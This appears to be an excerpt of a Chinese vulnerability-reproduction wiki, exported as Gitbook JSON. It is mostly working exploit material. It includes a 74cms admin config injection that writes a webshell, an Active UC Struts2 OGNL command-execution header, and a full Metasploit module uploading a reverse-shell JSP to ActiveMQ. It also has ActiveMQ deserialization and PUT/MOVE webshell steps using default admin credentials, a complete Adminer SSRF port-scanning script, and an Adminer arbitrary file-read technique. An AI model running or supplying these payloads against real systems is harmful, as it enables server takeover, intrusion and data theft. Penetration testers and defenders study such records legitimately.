if($site_domain == C('qscms_wap_domain')){ $this->returnMsg(0,'主域名不能与触屏版域名重复！'); } $str = str_replace('http://','',$site_domain); $str = str_replace('https://','',$str); if(preg_match('/com.cn|net.cn|gov.cn|org.cn$/',$str) === 1){ $domain = array_slice(explode('.', $str), -3, 3); }else{ $domain = array_slice(explode('.', $str), -2, 2); } $domain = '.'.implode('.',$domain); $config['SESSION_OPTIONS'] = array('domain'=>$domain); $config['COOKIE_DOMAIN'] = $domain; $this->update_config($config,CONF_PATH.'url.php'); } /ThinkPHP/Common/functions.php第271行中的I（\\'request.site_domain\\'，\\'\\'，\\'trim\\'）是字符串。request.site_domain-> $ _REQUEST [\\'site_domain\\']-> $ _ REQUEST [\\'site_domain\\']是字符串->修剪（$ _REQUEST [\\'site_domain\\']） function I($name,$default='',$filter=null,$datas=null) { ... if(strpos($name,'.')) { // 指定参数来源 list($method,$name) = explode('.',$name,2); }else{ // 默认为自动判断 $method = 'param'; } switch(strtolower($method)) { case 'get' : $input =& $_GET; break; case 'post' : $input =& $_POST; break; ... case 'request' : $input =& $_REQUEST; break; ... } if(''==$name) { // 获取全部变量 ... } }elseif(isset($input[$name])) { // 取值操作 $data = $input[$name]; $filters = isset($filter) ? $filter.','.C('DEFAULT_FILTER') : C('DEFAULT_FILTER'); //$filters = isset($filter)?$filter:C('DEFAULT_FILTER'); if($filters) { if(is_string($filters)){ if(0 === strpos($filters,'/')){ if(1 !== preg_match($filters,(string)$data)){ // 支持正则验证 return isset($default) ? $default : null; } }else{ $filters = explode(',',$filters); } }elseif(is_int($filters)){ $filters = array($filters); } if(is_array($filters)){ foreach($filters as $filter){ if(function_exists($filter)) { $data = is_array($data) ? array_map_recursive($filter,$data) : $filter($data); // 参数过滤 }else{ $data = filter_var($data,is_int($filter) ? $filter : filter_id($filter)); if(false === $data) { return isset($default) ? $default : null; } } } } } if(!empty($type)){ ... }else{ // 变量默认值 $data = isset($default)?$default:null; } is_array($data) && array_walk_recursive($data,'think_filter'); return $data; } 返回到/Application/Admin/Controller/ConfigController.class.php第29行：array（\\'SESSION_OPTIONS\\'=> array（\\'domain\\'=> $ domain），\\'COOKIE_DOMAIN\\'=> $ domain） -> update_config（$ config， CONF_PATH.\\'url.php\\'） $config['SESSION_OPTIONS'] = array('domain'=>$domain); $config['COOKIE_DOMAIN'] = $domain; $this->update_config($config,CONF_PATH.'url.php'); /Application/Common/Controller/BackendController.class.php第467 行中的update_config（$ config，CONF_PATH.\\'url.php\\'）： multimerge（$ config，$ new_config） -> file_put_contents（$ config_file，\" \\ public function update_config($new_config, $config_file = '') { !is_file($config_file) && $config_file = HOME_CONFIG_PATH . 'config.php'; if (is_writable($config_file)) { $config = require $config_file; $config = multimerge($config, $new_config); if($config['SESSION_OPTIONS']){ $config['SESSION_OPTIONS']['path'] = SESSION_PATH; } file_put_contents($config_file, \"multimerge($config, $new_config) in /Application/Common/Common/function.php Line 938: no restricted function multimerge($a, $b) { if (is_array($b) && count($b)) { foreach ($b as $k => $v) { if (is_array($v) && count($v)) { $a[$k] = in_array($k, array('SESSION_OPTIONS')) ? multimerge($a[$k], $v) : $v; } else { $a[$k] = $v; } } } else { $a = $b; } return $a; } CONF_PATH in /ThinkPHP/ThinkPHP.php Line 54: CONF_PATH.\\'url.php\\' -> /Application/Common/Conf/url.php defined('COMMON_PATH') or define('COMMON_PATH', APP_PATH.'Common/'); // 应用公共目录 defined('CONF_PATH') or define('CONF_PATH', COMMON_PATH.'Conf/'); define('APP_PATH','./Application/'); var_export(): Quote string with slashes&Convert special characters to HTML entities -> stripslashes(): un-quotes a quoted string -> Convert special characters to HTML entities -> write file file_put_contents($config_file, \"/Application/Home/Conf/url.php: The code after \\\"return array(...);\\\" does not work, so payload is site_domain=\\', {your php code},\\' 0, 'URL_HTML_SUFFIX' => '.html', 'URL_PATHINFO_DEPR' => '/', 'URL_ROUTER_ON' => true, 'URL_ROUTE_RULES' => array ( '/^jobfair\\/(?!admin)(\\w+)$/' => 'jobfair/index/:1', '/^mall\\/(?!admin)(\\w+)$/' => 'mall/index/:1', ), 'QSCMS_VERSION' => '5.0.1', 'QSCMS_RELEASE' => '2019-03-19 00:00:00', 'SESSION_OPTIONS' => array ( 'domain' => '.0.1', 0 => 18, 1 => '', 'path' => 'D:\\***\\***\\***\\WWW\\74cms\\data\\session', ), 'COOKIE_DOMAIN' => '.0.1', 0 => 18, 1 => '', ); 复现poc -> PD9waHAgcGhwaW5mbygpOz8+ site_domain=\\', file_put_contents(\\'403.php\\',base64_decode(\\'PD9waHAgcGhwaW5mbygpOz8+\\')),\\' POST /74cms/index.php?m=Admin&c=config&a=edit HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://127.0.0.1/74cms/index.php?m=Admin&c=Config&a=index Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 465 Connection: close Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default site_name=%E9%AA%91%E5%A3%AB%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F&site_domain='%2C+file_put_contents('403.php'%2Cbase64_decode('PD9waHAgcGhwaW5mbygpOz8%2B'))%2C'&site_dir=%2F74cms%2F&top_tel=000-00000000&bootom_tel=000-00000000&contact_email=&address=00%E7%9C%8100%E5%B8%8200%E8%B7%AF00%E5%8F%B70%E5%A4%A7%E5%8E%A600%E6%A5%BC&bottom_other=Copyright+%C2%A9+2019+74cms.com+All+Right+Reserved+&icp=icp000000000&isclose=0&close_reason=&statistics=&logo_home=&logo_other= GET /74cms/Application/Common/Conf/url.php HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 成功截图 四、参考链接 https://github.com/kyrie403/Vuln/blob/master/74cms/74cms%20v5.0.1%20remote%20code%20execution.md Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:17 "},"Web安全/74cms/74cms v6.0.4 反射型xss/74cms v6.0.4 反射型xss.html":{"url":"Web安全/74cms/74cms v6.0.4 反射型xss/74cms v6.0.4 反射型xss.html","title":"74cms v6.0.4 反射型xss","keywords":"","body":"74cms v6.0.4 反射型xss 一、漏洞简介 二、漏洞影响 74cms v6.0.4 三、复现过程 http://www.0-sec.org/index.php?m=&c=help&a=help_list&key=137244gq1lw%253cscript%253ealert%25281%2529%253c%252fscript%253edutvxlqd4lq&__hash__=d7aa5a382f14d270c3ac4de8392b4e1d_a34adb2b339972672eb447276f69ee88 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:18 "},"Web安全/Active UC/Active UC index.action 远程命令执行漏洞/Active UC index.action 远程命令执行漏洞.html":{"url":"Web安全/Active UC/Active UC index.action 远程命令执行漏洞/Active UC index.action 远程命令执行漏洞.html","title":"Active UC index.action 远程命令执行漏洞","keywords":"","body":"Active UC index.action 远程命令执行漏洞 漏洞描述 网动统一通信平台 Active UC index.action 存在S2-045远程命令执行漏洞, 通过漏洞可以执行任意命令 漏洞影响 Active UC FOFA title=\"网动统一通信平台(Active UC)\" 漏洞复现 登录页面如下 发送如下请求包 POST /acenter/index.action HTTP/1.1 Cookie: SessionId=96F3F15432E0660E0654B1CE240C4C36 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Charsert: UTF-8 Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='dir').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}; boundary=---------------------------18012721719170 Cache-Control: no-cache Pragma: no-cache Host: Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive Content-Length: 196 -----------------------------18012721719170 Content-Disposition: form-data; name=\"pocfile\"; filename=\"text.txt\" Content-Type: text/plain xxxxxxx -----------------------------18012721719170 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:23 "},"Web安全/ActiveMQ/（CVE-2015-1830）ActiveMQ 路径遍历导致未经身份验证的rce/（CVE-2015-1830）ActiveMQ 路径遍历导致未经身份验证的rce.html":{"url":"Web安全/ActiveMQ/（CVE-2015-1830）ActiveMQ 路径遍历导致未经身份验证的rce/（CVE-2015-1830）ActiveMQ 路径遍历导致未经身份验证的rce.html","title":"（CVE-2015-1830）ActiveMQ 路径遍历导致未经身份验证的rce","keywords":"","body":"（CVE-2015-1830）ActiveMQ 路径遍历导致未经身份验证的rce 一、漏洞简介 Windows 5.11.2之前的Apache ActiveMQ 5.x中blob消息的文件服务器上载/下载功能中的目录遍历漏洞允许远程攻击者通过未指定的向量在任意目录中创建JSP文件。 二、漏洞影响 ActiveMQ 5.11.1 三、复现过程 msf poc 直接在msf里面搜索就行了，如果没有请更新msf版本，或者手动复制下面的脚本到msf目录下。 ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule 'Apache ActiveMQ 5.x-5.11.1 Directory Traversal Shell Upload', 'Description' => %q{ This module exploits a directory traversal vulnerability (CVE-2015-1830) in Apache ActiveMQ 5.x before 5.11.2 for Windows. The module tries to upload a JSP payload to the /admin directory via the traversal path /fileserver/..\\\\admin\\\\ using an HTTP PUT request with the default ActiveMQ credentials admin:admin (or other credentials provided by the user). It then issues an HTTP GET request to /admin/.jsp on the target in order to trigger the payload and obtain a shell. }, 'Author' => [ 'David Jorm', # Discovery and exploit 'Erik Wynter' # @wyntererik - Metasploit ], 'References' => [ [ 'CVE', '2015-1830' ], [ 'EDB', '40857'], [ 'URL', 'https://activemq.apache.org/security-advisories.data/CVE-2015-1830-announcement.txt' ] ], 'Privileged' => false, 'Platform' => %w{ win }, 'Targets' => [ [ 'Windows Java', { 'Arch' => ARCH_JAVA, 'Platform' => 'win' } ], ], 'DisclosureDate' => '2015-08-19', 'License' => MSF_LICENSE, 'DefaultOptions' => { 'RPORT' => 8161, 'PAYLOAD' => 'java/jsp_shell_reverse_tcp' }, 'DefaultTarget' => 0)) register_options([ OptString.new('TARGETURI', [true, 'The base path to the web application', '/']), OptString.new('PATH', [true, 'Traversal path', '/fileserver/..\\\\admin\\\\']), OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']), OptString.new('PASSWORD', [true, 'Password to authenticate with', 'admin']) ]) end def check print_status(\"Running check...\") testfile = Rex::Text::rand_text_alpha(10) testcontent = Rex::Text::rand_text_alpha(10) send_request_cgi({ 'uri' => normalize_uri(target_uri.path, datastore['PATH'], \"#{testfile}.jsp\"), 'headers' => { 'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']) }, 'method' => 'PUT', 'data' => \"\" }) res1 = send_request_cgi({ 'uri' => normalize_uri(target_uri.path,\"admin/#{testfile}.jsp\"), 'headers' => { 'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']) }, 'method' => 'GET' }) if res1 && res1.body.include?(testcontent) send_request_cgi( opts = { 'uri' => normalize_uri(target_uri.path,\"admin/#{testfile}.jsp\"), 'headers' => { 'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']) }, 'method' => 'DELETE' }, timeout = 1 ) return Exploit::CheckCode::Vulnerable end Exploit::CheckCode::Safe end def exploit print_status(\"Uploading payload...\") testfile = Rex::Text::rand_text_alpha(10) vprint_status(\"If upload succeeds, payload will be available at #{target_uri.path}admin/#{testfile}.jsp\") #This information is provided to allow for manual execution of the payload in case the upload is successful but the GET request issued by the module fails. send_request_cgi({ 'uri' => normalize_uri(target_uri.path, datastore['PATH'], \"#{testfile}.jsp\"), 'headers' => { 'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']) }, 'method' => 'PUT', 'data' => payload.encoded }) print_status(\"Payload sent. Attempting to execute the payload.\") res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path,\"admin/#{testfile}.jsp\"), 'headers' => { 'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']) }, 'method' => 'GET' }) if res && res.code == 200 print_good(\"Payload executed!\") else fail_with(Failure::PayloadFailed, \"Failed to execute the payload\") end end end Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:19 "},"Web安全/ActiveMQ/（CVE-2015-5254）ActiveMQ 反序列化漏洞/（CVE-2015-5254）ActiveMQ 反序列化漏洞.html":{"url":"Web安全/ActiveMQ/（CVE-2015-5254）ActiveMQ 反序列化漏洞/（CVE-2015-5254）ActiveMQ 反序列化漏洞.html","title":"（CVE-2015-5254）ActiveMQ 反序列化漏洞","keywords":"","body":"（CVE-2015-5254）ActiveMQ 反序列化漏洞 一、漏洞简介 Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。 二、漏洞影响 Apache ActiveMQ 5.13.0之前的5.x版本 三、复现过程 漏洞利用过程如下： 构造（可以使用ysoserial）可执行命令的序列化对象 作为一个消息，发送给目标61616端口 访问web管理页面，读取消息，触发漏洞 使用jmet进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。 jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。 执行： java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \"touch /tmp/success\" -Yp ROME your-ip 61616 ActiveMQ反序列化漏洞/media/rId25.png) 此时会给目标ActiveMQ添加一个名为event的队列，我们可以通过http://your-ip:8161/admin/browse.jsp?JMSDestination=event看到这个队列中所有消息： ActiveMQ反序列化漏洞/media/rId26.png) 点击查看这条消息即可触发命令执行，此时进入容器docker-compose exec activemq bash，可见/tmp/success已成功创建，说明漏洞利用成功： ActiveMQ反序列化漏洞/media/rId27.png) 将命令替换成弹shell语句再利用： ActiveMQ反序列化漏洞/media/rId28.png) 值得注意的是，通过web管理页面访问消息并触发漏洞这个过程需要管理员权限。在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发，或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。 参考链接 https://vulhub.org/\\#/environments/activemq/CVE-2015-5254/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:20 "},"Web安全/ActiveMQ/（CVE-2016-3088）ActiveMQ应用漏洞/（CVE-2016-3088）ActiveMQ应用漏洞.html":{"url":"Web安全/ActiveMQ/（CVE-2016-3088）ActiveMQ应用漏洞/（CVE-2016-3088）ActiveMQ应用漏洞.html","title":"（CVE-2016-3088）ActiveMQ应用漏洞","keywords":"","body":"（CVE-2016-3088）ActiveMQ应用漏洞 一、漏洞简介 ActiveMQ是一款流行的开源消息服务器。默认情况下，ActiveMQ服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。 二、漏洞影响 Apache ActiveMQ 5.x ~ 5.14.0 三、复现过程 漏洞是需要登录之后才可以执行 漏洞利用就是/fileserver/有put上传权限，/admin/有执行权限，可找到绝对路径，使用move移动文件到/admin/ 下面就是两步走，先是利用put上传文件到/fileserver/,然后移动到move到admin下面 所有返回为204就代表是成功，有个坑点：不要put同文件名的文件上去 如果上传不解析的话，则是证明没有权限！！！ 如果上传不解析的话，则是证明没有权限！！！ 如果上传不解析的话，则是证明没有权限！！！ ActiveMQ默认开启PUT方法，当fileserver存在时我们可以上传jspwebshell。 ActiveMQ应用漏洞/media/rId24.png) PUT /fileserver/shell.jsp HTTP/1.1 Host: 192.168.197.25:8161 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Connection: keep-alive Upgrade-Insecure-Requests: 1 Authorization: Basic YWRtaW46YWRtaW4= shell 利用 MOVE 方法将 Webshell 移入 admin/ 目录 ActiveMQ应用漏洞/media/rId25.png) Request Raw: MOVE /fileserver/shell.jsp HTTP/1.1 Destination:file:/data/apache-activemq-5.7.0/webapps/admin/shell.jsp Host: 192.168.197.25:8161 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Connection: keep-alive Upgrade-Insecure-Requests: 1 Authorization: Basic YWRtaW46YWRtaW4= Content-Length: 17 Content-Length: 0 shell ActiveMQ应用漏洞/media/rId26.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:21 "},"Web安全/ActiveMQ/（CVE-2017-15709）ActiveMQ 信息泄漏漏洞/（CVE-2017-15709）ActiveMQ 信息泄漏漏洞.html":{"url":"Web安全/ActiveMQ/（CVE-2017-15709）ActiveMQ 信息泄漏漏洞/（CVE-2017-15709）ActiveMQ 信息泄漏漏洞.html","title":"（CVE-2017-15709）ActiveMQ 信息泄漏漏洞","keywords":"","body":"（CVE-2017-15709）ActiveMQ 信息泄漏漏洞 一、漏洞简介 Apache ActiveMQ默认消息队列61616端口对外，61616端口使用了OpenWire协议，这个端口会暴露服务器相关信息，这些相关信息实际上是debug信息。 会返回应用名称，JVM，操作系统以及内核版本等信息。 二、漏洞影响 apache-activemq-5.15.0 to apache-activemq-5.15.2apache-activemq-5.14.0 to apache-activemq-5.14.5 三、复现过程 ActiveMQ信息泄漏漏洞/media/rId24.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:22 "},"Web安全/ActiveMQ/ActiveMQ物理路径泄漏漏洞/ActiveMQ物理路径泄漏漏洞.html":{"url":"Web安全/ActiveMQ/ActiveMQ物理路径泄漏漏洞/ActiveMQ物理路径泄漏漏洞.html","title":"ActiveMQ物理路径泄漏漏洞","keywords":"","body":"ActiveMQ物理路径泄漏漏洞 一、漏洞简介 ActiveMQ默认开启PUT请求，当开启PUT时，构造好Payload(即不存在的目录)，Response会返回相应的物理路径信息 二、漏洞影响 三、复现过程 Request Raw: PUT /fileserver/a../../%08/..%08/.%08/%08 HTTP/1.1 Host: 192.168.197.25:8161 Authorization: Basic YWRtaW46YWRtaW4= Content-Length: 4 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:19 "},"Web安全/Adminer/（CVE-2018-7667）Adminer服务器端请求伪造漏洞/（CVE-2018-7667）Adminer服务器端请求伪造漏洞.html":{"url":"Web安全/Adminer/（CVE-2018-7667）Adminer服务器端请求伪造漏洞/（CVE-2018-7667）Adminer服务器端请求伪造漏洞.html","title":"（CVE-2018-7667）Adminer服务器端请求伪造漏洞","keywords":"","body":"（CVE-2018-7667）Adminer 服务器端请求伪造漏洞 一、漏洞简介 Adminer 4.3.1及之前版本存在服务器端请求伪造漏洞。攻击者可借助'server'参数利用该漏洞绕过防火墙，确定内部主机，扫描其他服务器的端口。 二、漏洞影响 Adminer\\ 三、复现过程 poc import socket,re,ssl,warnings,subprocess,time from platform import system as system_name from os import system as system_call #Adminer Server Side Request Forgery #PortMiner Scanner Tool #by John Page (hyp3rlinx) #ISR: ApparitionSec #hyp3rlinx.altervista.org #========================= #D1rty0Tis says hi. #timeout MAX_TIME=32 #ports to log port_lst=[] #Web server response often times out but usually means ports open. false_pos_ports=['80','443'] BANNER=''' ____ _ __ __ _ | _ \\ | | | \\/ (_) | |__) |__ _ __| |_| \\ / |_ _ __ ___ _ __ | ___/ _ \\| '__| __| |\\/| | | '_ \\ / _ \\ '__| | | | (_) | | | |_| | | | | | | | __/ | |_| \\___/|_| \\__|_| |_|_|_| |_|\\___|_| ''' def info(): print \"\\nPortMiner depends on Error messages to determine open/closed ports.\" print \"Read operations reported 'timed out' may be open/filtered.\\n\" def greet(): print 'Adminer Unauthenticated SSRF Port Scanner Tool' print 'Targets Adminer used for MySQL administration\\n' print 'by hyp3rlinx - apparition security' print '-----------------------------------------------------\\n' print 'Scan small ranges or single ports or expect to wait.\\n' print 'Do not scan networks without authorized permission.' print 'Author not responsible for abuse/misuse.\\n' def chk_ports(p): p=p.replace('-',',') port_arg=p.split(',') try: if len(port_arg)>1: if int(port_arg[1]) 65535: print 'Exceeded max Port range 65535.' raw_input() return except Exception as e: print str(e) return None return list(range(int(port_arg[0]),int(port_arg[1])+1)) def log(IP): try: file=open('PortMiner.txt', 'w') file.write(IP+'\\n') for p in port_lst: file.write(p+'\\n') file.close() except Exception as e: print str(e) print \"\\nSee PortMiner.txt\" def use_ssl(ADMINER,ADMINER_PORT): try: s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ADMINER,int(ADMINER_PORT))) s=ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23) s.close() except Exception as e: print \"\" return False return True def version(ip,port,uri,use_ssl): res=\"\" try: s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip,int(port))) if use_ssl: s=ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23) s.send('GET '+'/'+uri+'/?server='+':'+'&username=\\r\\n\\r\\n') except Exception as e: print 'Host up but cant connect.' #str(e) print 'Re-check Host/Port/URI.' s.close() return 504 while True: RES=s.recv(512) if RES.find('Forbidden')!=-1: print 'Forbidden 403' s.close() return None if RES.find('401 Authorization Required')!=-1: print '401 Authorization Required' s.close() return None ver = re.findall(r'(.*)',RES,re.DOTALL|re.MULTILINE) if not RES: s.close() return None if ver: print 'Your Adminer '+ ver[0] + ' works for us now.' s.close() return ver s.close() return None def scan(ADMINER,ADMINER_PORT,ADMINER_URI,TARGET,PORTS_TO_SCAN,PRINT_CLOSED,USE_SSL): global MAX_TIME,port_range RES='' print 'scanning ports: %s ' % str(port_range[0])+'to ' + str(port_range[-1])+' ...' for aPort in port_range: aPort=str(aPort) try: s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.settimeout(MAX_TIME) s.connect((ADMINER,ADMINER_PORT)) if USE_SSL: s=ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23) s.send('GET /'+ADMINER_URI+'/?server='+TARGET+':'+aPort+'&username= HTTP/1.1\\r\\nHost: '+TARGET+'\\r\\n\\r\\n') except Exception as e: print str(e) s.close() return while True: try: RES=s.recv(512) ###print RES ###Should see HTTP/1.1 403 not 200 if RES.find('HTTP/1.1 200 OK')!=-1: print 'port '+aPort + ' open' port_lst.append(aPort+' open') s.close() break if RES.find('400 Bad Request')!=-1: print '400 Bad Request, check params' s.close() break raw_input() lst=re.findall(r\"([^\\n].*connect to MySQL server on.*[^\\n])|(Lost connection to MySQL server at.*)|(MySQL server has gone away.*)\"+ \"|(No connection could be made because the target machine actively refused it.*)|(A connection attempt failed.*)|(HTTP/1.1 200 OK.*)\", RES) if lst: status=str(lst) if status.find('connect to MySQL')!=-1: if PRINT_CLOSED: print 'port '+ aPort + ' closed' s.close() break elif status.find('machine actively refused it.')!=-1: if PRINT_CLOSED: print 'port '+ aPort + ' closed' s.close() break elif status.find('A connection attempt failed')!=-1: if PRINT_CLOSED: print 'port '+ aPort + ' closed' s.close() break elif status.find('reading initial communication packet')!=-1: print 'port '+aPort + ' open' port_lst.append(aPort+' open') s.close() break elif status.find('MySQL server has gone away')!=-1: print 'port '+aPort + ' open' port_lst.append(aPort+' open') s.close() break elif status.find('Bad file descriptor')!=-1: print 'port '+aPort + ' open' port_lst.append(aPort+' open') s.close() break elif status.find('Got packets out of order')!=-1: print 'port '+aPort + ' open' s.close() break except Exception as e: msg = str(e) ###print msg if msg.find('timed out')!=-1 and aPort in false_pos_ports: print 'port '+aPort + ' open' port_lst.append(aPort+' open') s.close() break elif msg.find('timed out')!=-1: print 'port '+aPort + ' timed out' port_lst.append(aPort+' read operation timed out') s.close() break else: s.close() break if port_lst: log(TARGET) else: print \"Scan completed, no ports mined.\" return 0 def arp(host): args = \"-a\" if system_name().lower()==\"windows\" else \"-e\" return subprocess.call(\"arp \" + args + \" \" + host, shell=True) == 0 def ping_host(host): args = \"-n 1\" if system_name().lower()==\"windows\" else \"-c 1\" res=subprocess.call(\"ping \" + args + \" \" + host, shell=True) == 0 if not res: print str(host) + ' down? trying ARP' if not arp(host): print str(host) + ' unreachable.' return return res def main(): global port_range print BANNER greet() ADMINER_VERSION=False PRINT_CLOSED=False USE_SSL=None ADMINER=raw_input('[+] Adminer Host/IP> ') if ADMINER=='': print 'Enter valid Host/IP' ADMINER=raw_input('[+] Adminer Host/IP> ') ADMINER_PORT=raw_input('[+] Adminer Port> ') if not re.search(\"^\\d{1,5}$\",ADMINER_PORT): print 'Enter a valid Port.' ADMINER_PORT=raw_input('[+] Adminer Port> ') ADMINER_URI=raw_input('[+] Adminer URI [the adminer-.php OR adminer/ dir path] > ') TARGET=raw_input('[+] Host/IP to Scan> ') PORTS_TO_SCAN=raw_input('[+] Port Range e.g. 21-25> ').replace(' ','') plst=re.findall(r\"(\\d{1,5})-(\\d{1,5})\",PORTS_TO_SCAN) if not plst: print 'Invalid ports, format is 1-1025' return raw_input() #console up port_range=chk_ports(PORTS_TO_SCAN) if not port_range: return PRINT_CLOSED=raw_input('[+] Print closed ports? 1=Yes any key for No> ') if PRINT_CLOSED=='1': PRINT_CLOSED=True else: PRINT_CLOSED=False if not ping_host(ADMINER): print 'host %s not reachable or blocking ping ' % ADMINER cont=raw_input('Continue with scan? 1=Yes any key for No> ') if cont!='1': print 'Scan aborted.' raw_input() #console up return USE_SSL=use_ssl(ADMINER,ADMINER_PORT) time.sleep(2) ADMINER_VERSION = version(ADMINER,ADMINER_PORT,ADMINER_URI,USE_SSL) if not ADMINER_VERSION: print \"Can't retrieve Adminer script. check supplied URI.\" raw_input() #console up return else: if ADMINER_VERSION==504: raw_input() #console up return if scan(ADMINER,int(ADMINER_PORT),ADMINER_URI,TARGET,PORTS_TO_SCAN,PRINT_CLOSED,USE_SSL)==0: more=raw_input('Info: 1=Yes, any key for No> ') if more=='1': info() raw_input() #console up if __name__=='__main__': main() Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:27 "},"Web安全/Adminer/Adminer 任意文件读取漏洞/Adminer 任意文件读取漏洞.html":{"url":"Web安全/Adminer/Adminer 任意文件读取漏洞/Adminer 任意文件读取漏洞.html","title":"Adminer 任意文件读取漏洞","keywords":"","body":"Adminer 任意文件读取漏洞 一、漏洞简介 准确的说该漏洞源于MySQL LOAD DATA 读取客户端任意文件 Mysql可以使用LOAD DATA INFILE来读取文件，通常有两种用法，分别是： load data infile \"/data/data.csv\" into table test; load data local infile \"/data/data.csv\" into table test; 第一种用法是从mysql自己的服务器上读取data.csv文件. 第二种用法是客户端把客户端电脑上的data.csv发给mysql服务器的表中. 而mysql客户端读取漏洞利用的语句即第二条语句. 前提 phpmyadmin 开启了远程连接选项，adminer是默认开启的. $cfg['AllowArbitraryServer'] = true; //false改为true libraries下面的config.default.php mysql中secure_file_priv为空，即支持load infile的使用 未开启open_basedir(开启情况需要拿shell，否则只能读到指定目录下的文件) 二、漏洞影响 三、复现过程 漏洞分析 正常流程来说当客户端向服务端发起load data infile \"/etc/passwd\"的时候. 1、客户端会对服务器说：我要把我的etc/passwd文件插入到你的表中 (客户端->>服务端: Load data infile '/etc/passwd'... ) 2、服务器对客户端说：好啊，读取你本地的/etc/passwd文件 (服务端->>客户端: Response TABULAR) 3、客户端将data文件的内容发给服务器 (客户端->>服务端: etc/passwd的内容) 而这里存在逻辑错误，即服务端可以不管客户端的请求，直接向客户端发送一个Response TABULAR， 这样逻辑就变成了： 1、客户端会对服务端说：NULL 2、服务端对客户端说：好啊，读取你本地的/etc/passwd文件 (服务端->>客户端: Response TABULAR) 3、客户端将/etc/passwd文件的内容发给服务器 (客户端->>服务端: testtest) 那么设想一种场景： 这样服务端就可以读取客户端机器上的任意文件. 